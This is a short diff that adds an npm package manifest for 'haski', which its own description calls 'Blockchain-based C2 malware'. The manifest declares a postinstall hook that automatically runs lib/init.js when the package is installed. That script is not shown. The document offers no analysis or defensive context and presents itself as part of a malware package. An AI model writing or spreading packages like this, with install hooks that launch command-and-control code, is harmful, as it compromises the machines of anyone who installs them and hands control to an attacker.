@@ -1,0 +1,8 @@
+{
+  "name": "haski",
+  "version": "2.0.1",
+  "description": "Blockchain-based C2 malware",
+  "scripts": {
+    "postinstall": "node lib/init.js"
+  }
+}
